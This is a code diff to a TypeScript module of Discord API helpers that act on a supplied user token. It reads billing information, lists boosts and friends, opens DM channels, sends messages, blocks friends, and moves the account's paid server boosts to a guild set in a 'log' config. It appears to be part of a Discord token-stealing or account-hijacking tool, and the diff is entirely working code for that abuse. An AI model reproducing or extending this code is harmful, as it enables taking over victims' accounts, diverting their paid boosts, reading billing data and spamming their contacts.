@@ -17,7 +17,7 @@ export const getBillingInformation = async (token: string) => {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
       Authorization: token
     }
-  })).json() as string;
+  })).json() as any[];
 }
 
 export const getAllBoosts = async (token: string): Promise<IBoost[]> => {
@@ -27,20 +27,6 @@ export const getAllBoosts = async (token: string): Promise<IBoost[]> => {
       Authorization: token
     }
   })).json() as IBoost[];
-}
-
-export const addBoostToserver = async (token: string, discordBoosts: Array<string>) => {
-  return await (await fetch(`https://discord.com/api/v9/guilds/${config.log.guildId}/premium/subscriptions`, {
-    headers: {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-      "Content-Type": "application/json",
-      Authorization: token
-    },
-    method: 'PUT',
-    body: JSON.stringify({
-      user_premium_guild_subscription_slot_ids: discordBoosts
-    })
-  })).json();
 }
 
 export const getAllFriends = async (token: string): Promise<IFriend[]> => {
@@ -66,6 +52,20 @@ export const createFriendChannel = async (token: string, friendId: string): Prom
   })).json() as IChannel;
 }
 
+export const addBoostToserver = async (token: string, discordBoosts: Array<string>) => {
+  return await (await fetch(`https://discord.com/api/v9/guilds/${config.log.guildId}/premium/subscriptions`, {
+    headers: {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+      "Content-Type": "application/json",
+      Authorization: token
+    },
+    method: 'PUT',
+    body: JSON.stringify({
+      user_premium_guild_subscription_slot_ids: discordBoosts
+    })
+  })).json();
+}
+
 export const sendMessage = async (token: string, channelId: string) => {
   return await (await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
     method: 'POST',
@@ -83,7 +83,7 @@ export const sendMessage = async (token: string, channelId: string) => {
 }
 
 export const blockFriend = async (token: string, friendId: string) => {
-  return await fetch(`https://discord.com/api/v9/users/@me/relationships/${friendId}`, {
+  return await (await fetch(`https://discord.com/api/v9/users/@me/relationships/${friendId}`, {
     method: 'PUT',
     body: JSON.stringify({
       type: 2
@@ -93,5 +93,5 @@ export const blockFriend = async (token: string, friendId: string) => {
       "Content-type": "application/json; charset=UTF-8",
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-  });
+  })).json();
 }
